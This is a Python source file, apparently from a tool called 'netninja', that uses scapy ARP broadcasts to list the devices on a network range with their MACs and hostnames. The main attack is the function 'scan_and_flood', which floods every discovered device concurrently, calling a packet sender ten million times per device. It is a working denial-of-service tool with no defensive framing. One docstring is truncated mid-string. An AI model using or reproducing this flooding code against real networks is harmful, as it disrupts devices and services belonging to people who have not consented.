import concurrent.futures
import scapy.all as scapy
import socket
from netninja.send_packet import send_packet


def scan(ip):
    """
    Scan a given IP address or range to find devices on the network.

    Args:
    ip (str): IP address or range (e.g., '192.168.1.1/24').

    Returns:
    list of dicts: Each dict contains 'ip' and 'mac' of a discovered device.
    """
    arp_request = scapy.ARP(
        pdst=ip
    )  # Creating ARP request to ask who has the target IP
    broadcast = scapy.Ether(
        dst="ff:ff:ff:ff:ff:ff"
    )  # Creating Ethernet frame to broadcast
    arp_request_broadcast = (
        broadcast / arp_request
    )  # Combining the ARP request and broadcast
    answered_list = scapy.srp(
        arp_request_broadcast, timeout=1, verbose=False
    )[
        0
    ]  # Sending the packet and receiving the response

    clients_list = []
    for element in answered_list:
        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        clients_list.append(client_dict)
    return clients_list


def get_hostname(ip):
    """
    Get the hostname for a given IP address.

    Args:
    ip (str): IP address of the device.

    Returns:
    str: Hostname of the device.
    """
    try:
        return socket.gethostbyaddr(ip)[0]
    except socket.herror:
        return "Unknown"


def scanner(ip_range: str):
    """
    Scan a given IP address or range to find devices on the network.

    Args:
    ip_range (str): IP address or range (e.g., '
    """
    # Using the Scanner
    network_range = ip_range  # Specify your network range here
    devices = scan(network_range)

    for device in devices:
        device["hostname"] = get_hostname(device["ip"])
        print(
            f"IP: {device['ip']}, MAC: {device['mac']}, Hostname:"
            f" {device['hostname']}"
        )


def scan_and_flood(ip_range):
    """
    Scan the network and flood all devices.

    Args:
        ip_range (str): IP address or range (e.g., '192.168.1.0/24')
    """
    # Scan the network
    devices = scan(ip_range)

    # Get hostnames and print device info
    for device in devices:
        device["hostname"] = get_hostname(device["ip"])
        print(
            f"IP: {device['ip']}, MAC: {device['mac']}, Hostname:"
            f" {device['hostname']}"
        )

    # Flood all devices
    with concurrent.futures.ThreadPoolExecutor() as executor:
        # Concurrently flood all devices on the network
        executor.map(flood, devices)


def flood(device):
    # Flood a single device
    for i in range(10000000):
        send_packet(device["ip"])
